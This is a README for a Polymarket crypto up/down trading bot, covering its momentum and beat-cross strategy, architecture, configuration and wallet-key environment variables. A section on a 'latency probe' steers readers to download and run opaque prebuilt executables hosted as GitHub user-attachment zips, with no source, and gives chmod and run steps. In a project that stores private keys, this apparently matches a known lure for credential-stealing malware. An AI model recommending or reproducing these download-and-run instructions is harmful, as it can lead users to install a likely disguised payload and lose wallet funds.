# Beat Spike

Automated trading bot for Polymarket crypto **up/down** markets. Beat Spike watches short-term price momentum on Binance or Chainlink, enters only when the move **crosses the slug-open beat price**, and buys in the **direction of the spike** (UP on a down→up cross, DOWN on an up→down cross).

Default mode is **paper trading** — no live orders until you configure credentials and enable execution.

## How it works

Each Polymarket up/down market has a **beat price** (the reference price at market open). Beat Spike runs a two-stage pipeline:

1. **Momentum trigger** — On the configured signal feed, `|price_now − price_{now−lookback}|` must exceed a USD threshold (e.g. $24 for BTC with a 3s lookback).
2. **Beat-cross direction** — The lookback window must cross the slug-open beat:
   - Price moves **below → above** beat → buy **UP**
   - Price moves **above → below** beat → buy **DOWN**
   - No cross → trade rejected

Orders are placed on the Polymarket CLOB (limit by default) during a configurable entry window (e.g. 240s after slug open on 5m BTC markets).

```text
Feed tick
  → |Δ| ≥ threshold?          (momentum spike)
  → ref and now straddle beat?
      → cross up   → BUY UP
      → cross down → BUY DOWN
  → CLOB order on chosen token
```

## Architecture

| Component | Command | Port | Role |
|-----------|---------|------|------|
| Dashboard server | `make server` | 8788 | Chainlink + Binance WebSocket feeds, beat resolution, REST/WS API |
| Trading bot | `make bot` | — | Detection, beat filter, order execution |
| Web UI | `make web` | 5174 | Live feeds, charts, trade history |
| Profile monitor | `make monitor` | — | Optional wallet watcher (disabled by default) |

The bot reads feeds from the dashboard server by default (`feeds.source: server`), so start the server before the bot.

## Quick start

```bash
make install          # Python venv + deps + web npm
cp .env.example .env  # optional; created automatically by make install

# Terminal 1 — feeds + API
make server

# Terminal 2 — paper bot
make bot

# Terminal 3 — dashboard UI
make web
```

Open http://localhost:5174 for the dashboard. Health check: `make health`.

### PM2 (production-style)

```bash
make pm2-start    # server + bot + web + monitor
make pm2-status
make pm2-logs
make pm2-stop
```

## Configuration

Primary config: [`config/default.yaml`](config/default.yaml)

| Section | Purpose |
|---------|---------|
| `bot.mode` | `paper` or `live` |
| `markets` | Assets and intervals (e.g. BTC 5m) |
| `entry` | Seconds after slug open / before close to allow entries |
| `strategy` | Signal feed, lookback, thresholds, beat-cross logic |
| `trading` | Share size, limit price, order style |
| `execution` | CLOB credentials gate (keep secrets in `.env`) |
| `feeds` | `server` (recommended) or `local` WebSocket feeds |
| `chainlink` | Optional Data Streams credentials for precise beat lookup |

Per-asset thresholds live under `strategy.by_asset`. Signal feed options: **`binance`** or **`chainlink`**.

### Environment variables

Set in `.env` (see [`.env.example`](.env.example)):

| Variable | Purpose |
|----------|---------|
| `BEAT_SPIKE_EXECUTION__PRIVATE_KEY` | Wallet private key (live only) |
| `BEAT_SPIKE_EXECUTION__FUNDER` | Polymarket proxy/funder address |
| `BEAT_SPIKE_EXECUTION__API_KEY` | CLOB API key |
| `BEAT_SPIKE_EXECUTION__API_SECRET` | CLOB API secret |
| `BEAT_SPIKE_EXECUTION__API_PASSPHRASE` | CLOB passphrase |
| `BEAT_SPIKE_BOT__MODE` | Override `bot.mode` |
| `BEAT_SPIKE_CHAINLINK__STREAMS_*` | Chainlink Data Streams credentials |

Legacy `DAWN_*` env names are still accepted as fallbacks.

### Live trading

1. Set wallet and CLOB credentials in `.env`.
2. Set `execution.enabled: true` and `bot.mode: live` in config (or via env).
3. Confirm risk limits under `risk` if enabled.
4. Run `make server` then `make bot`.

**Never commit `.env` or private keys.**

## Price feeds

| Feed | Source | Used for |
|------|--------|----------|
| Binance | Spot ticker WebSocket | Default signal feed; fast momentum |
| Chainlink | Polymarket RTDS or Data Streams | Resolution-aligned beat; optional signal feed |

Coinbase is not supported — use Binance or Chainlink.

## Essential tip: Polymarket latency probe

**A fast, lightweight latency monitoring tool for Polymarket endpoints.** Monitor REST API and WebSocket response times in real time — useful when tuning Beat Spike feed sources, server placement, and order execution.

![Latency probe example](assets/latancy%20example.png)

### Features

- Real-time latency monitoring for key Polymarket endpoints
- Support for REST APIs and WebSockets
- Color-coded results and statistics (min, avg, p95, p99)
- Lightweight and cross-platform
- No installation required — download, extract, and run

### Pre-built binaries

Pre-built zip archives are included in [`bin/`](bin/):

| Platform | Architecture | File |
|----------|--------------|------|
| **Linux** | x86_64 | [polymarket-latency-probe-linux-x86_64.zip](https://github.com/user-attachments/files/29324285/polymarket-latency-probe-linux-x86_64.zip) |
| **Windows** | x64 | [`polymarket-latency-probe-windows-x64.zip`](https://github.com/user-attachments/files/29302588/polymarket-latency-probe-windows-x64.zip) |
| **macOS** | Apple Silicon (arm64) | [`polymarket-latency-probe-macos-arm64.zip`](https://github.com/user-attachments/files/29302597/polymarket-latency-probe-macos-arm64.zip) |

Run the probe from the same machine (or VPS region) as your bot to compare endpoint latency before choosing feeds or colocation.

### Quick start

1. Click your platform zip in the table above (or open [`bin/`](bin/) in a local clone) and extract it.
2. Run the executable:

```bash
# Linux / macOS
chmod +x polymarket-latency-probe
./polymarket-latency-probe

# Windows
polymarket-latency-probe.exe
```

## Monitor (optional)

[`config/monitor.yaml`](config/monitor.yaml) watches Polymarket profiles for up/down buys and captures price charts. It is **disabled by default**. Add your own profile URLs to `targets` and set `enabled: true` to use it.

## Data & logs

| Path | Contents |
|------|----------|
| `data/trades.jsonl` | Trade log |
| `data/bot_status.json` | Bot state |
| `data/trade_snapshots/` | Chart snapshots at trade time |
| `data/beat-spike.log` | Bot log file |
| `data/feed_beats.json` | Persisted per-slug beat prices |

## Project layout

```text
bot/           Trading logic, feeds, Polymarket CLOB integration
server/        FastAPI dashboard + feed aggregator
web/           React/Vite dashboard
config/        YAML configuration
data/          Runtime logs and snapshots (gitignored in production)
```

## Makefile reference

Run `make help` for all targets. Common commands:

- `make install` — Install dependencies
- `make server` / `make bot` / `make web` — Run components
- `make bot-stop` — Stop a running bot
- `make web-build` — Production UI build
- `make clean` — Remove venv and node_modules

## Disclaimer

This software is for educational and research purposes. Trading on prediction markets involves financial risk. You are responsible for compliance with applicable laws and Polymarket terms of service. Use at your own risk.
